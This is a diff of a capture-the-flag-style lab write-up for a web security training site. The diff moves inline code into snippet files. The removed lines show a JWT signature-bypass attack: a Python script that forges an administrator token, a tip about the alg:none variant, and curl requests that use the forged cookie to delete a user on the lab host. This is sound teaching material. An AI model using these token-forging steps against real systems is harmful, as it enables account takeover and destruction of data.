@@ -10,6 +10,7 @@ lang: "en"
 
 import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../components/PartialContainer.astro';
+import CodeSnippet from '../../components/CodeSnippet.astro';
 
 ## Necessary Background Concepts To Solve The Lab
 
@@ -22,28 +23,15 @@ import PartialContainer from '../../components/PartialContainer.astro';
 
 Let's explore the lab's login page directly and log in to get a valid JWT session token:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/login"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/01-bash.sh" />
 
 The login page has a simple form with a CSRF token:
 
-```html
-<form class=login-form method=POST action="/login">
-    <input required type="hidden" name="csrf" value="GOP5f7aWBkNGS3pTsbVMVbuGkunP162M">
-    <label>Username</label>
-    <input required type=username name="username" autofocus>
-    <label>Password</label>
-    <input required type=password name="password">
-    <button class=button type=submit> Log in </button>
-</form>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/02-html.html" />
 
 Let's log in with the provided credentials:
 
-```bash
-curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=GOP5f7aWBkNGS3pTsbVMVbuGkunP162M&username=wiener&password=peter"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/03-bash.sh" />
 
 > **Command breakdown**: \
 `-D -` = dump response headers to stdout \
@@ -51,17 +39,11 @@ curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=GOP5f7aWBk
 
 Response:
 
-```
-HTTP/2 302 
-location: /my-account?id=wiener
-set-cookie: session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/04-plain.http" />
 
 The session cookie is a JWT token. Let's decode it to understand its structure:
 
-```bash
-echo "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/05-bash.sh" />
 
 > **Command breakdown**: \
 `echo "..."` = output the JWT header part \
@@ -70,28 +52,15 @@ echo "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUz
 
 Header output:
 
-```json
-{
-  "kid": "2b4f98e4-e212-47b3-9c4b-a237d81a39e9",
-  "alg": "RS256"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/06-json.json" />
 
 Now decode the payload:
 
-```bash
-echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/07-bash.sh" />
 
 Payload output:
 
-```json
-{
-  "iss": "portswigger",
-  "exp": 1773866751,
-  "sub": "wiener"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/08-json.json" />
 
 The JWT uses **RS256** (RSA-SHA256) for signing, which is an asymmetric algorithm. However, the lab description tells us the server **doesn't verify the signature** at all. This means we can simply modify the payload without worrying about re-signing the token. The signature will be invalid, but the server won't check it.
 
@@ -103,30 +72,7 @@ All we need to do is:
 
 Let's create a Python script to forge the admin JWT:
 
-```python
-import base64
-import json
-
-JWT = "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg"
-
-header, payload, signature = JWT.split('.')
-
-# Decode the payload
-payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))
-
-# Tamper the sub claim to impersonate administrator
-payload_decoded['sub'] = 'administrator'
-
-# Re-encode the payload (compact JSON, no padding)
-tampered_payload = base64.urlsafe_b64encode(
-    json.dumps(payload_decoded, separators=(',', ':')).encode()
-).decode().rstrip('=')
-
-# Build forged JWT keeping original header and signature untouched
-forged_jwt = f"{header}.{tampered_payload}.{signature}"
-
-print(forged_jwt)
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/09-python.py" />
 
 > **Script breakdown**: \
 > The script forges an administrator JWT by:
@@ -138,9 +84,7 @@ print(forged_jwt)
 
 **Expected output:**
 
-```
-eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/10-plain.txt" />
 
 > **Note**: The server won't verify the signature anyway. You could even change the header `alg` to `none` and leave the signature empty, like: `header.payload.`
 
@@ -148,11 +92,7 @@ Notice that only the **middle part** (payload) changed. The header and signature
 
 Now let's access the admin panel with our forged JWT:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin" \
-  -b "session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg" \
-  | grep "carlos"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/11-bash.sh" />
 
 > **Command breakdown**: \
 `-b "session=..."` = send the forged JWT as a session cookie \
@@ -160,17 +100,11 @@ curl -s "https://<lab-url>.web-security-academy.net/admin" \
 
 Response:
 
-```html
-<span>carlos - </span>
-<a href="/admin/delete?username=carlos">Delete</a>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/12-html.html" />
 
 We have admin access. Now let's delete the user carlos:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
-  -b "session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-unverified-signature/13-bash.sh" />
 
 The missing signature verification let us **tamper with the JWT payload in plain sight**, no cryptographic trickery needed, just a base64 swap was enough to give carlos a one-way ticket to the delete query.
 
